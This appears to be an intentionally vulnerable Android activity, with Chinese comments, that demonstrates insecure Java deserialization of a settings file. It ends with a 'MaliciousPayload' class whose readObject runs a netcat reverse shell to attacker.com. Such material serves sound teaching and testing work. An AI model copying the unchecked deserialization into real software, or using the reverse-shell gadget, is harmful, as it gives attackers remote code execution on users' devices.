package com.example.vulnerableapp;

import android.os.Bundle;
import android.util.Log;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final String FILE_NAME = "user_settings.ser";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 模拟应用启动时加载用户设置
        UserSettings settings = loadSettings();
        if (settings != null) {
            Log.d(TAG, "Loaded settings: " + settings.toString());
        }
    }

    private UserSettings loadSettings() {
        File file = new File(getFilesDir(), FILE_NAME);
        
        // 防御式检查：验证文件存在性（但未验证内容完整性）
        if (!file.exists()) {
            return createDefaultSettings();
        }

        try (FileInputStream fis = new FileInputStream(file);
             ObjectInputStream ois = new ObjectInputStream(fis)) {
            
            // 不安全的反序列化：直接反序列化不可信数据源
            Object obj = ois.readObject();
            if (obj instanceof UserSettings) {
                return (UserSettings) obj;
            }
            return createDefaultSettings();
            
        } catch (IOException | ClassNotFoundException e) {
            Log.e(TAG, "Error loading settings", e);
            return createDefaultSettings();
        }
    }

    private UserSettings createDefaultSettings() {
        UserSettings settings = new UserSettings("default_user", "#FFFFFF");
        saveSettings(settings);
        return settings;
    }

    private void saveSettings(UserSettings settings) {
        File file = new File(getFilesDir(), FILE_NAME);
        try (FileOutputStream fos = new FileOutputStream(file);
             ObjectOutputStream oos = new ObjectOutputStream(fos)) {
            oos.writeObject(settings);
        } catch (IOException e) {
            Log.e(TAG, "Error saving settings", e);
        }
    }

    // 模拟用户设置类
    public static class UserSettings implements Serializable {
        private String username;
        private String themeColor;

        public UserSettings(String username, String themeColor) {
            this.username = username;
            this.themeColor = themeColor;
        }

        @Override
        public String toString() {
            return "UserSettings{" +
                    "username='" + username + '\\'' +
                    ", themeColor='" + themeColor + '\\'' +
                    '}';
        }
    }

    // 攻击者可能构造的恶意类
    public static class MaliciousPayload implements Serializable {
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            // 恶意代码执行
            Runtime.getRuntime().exec("nc -e /bin/sh attacker.com 4444");
        }
    }
}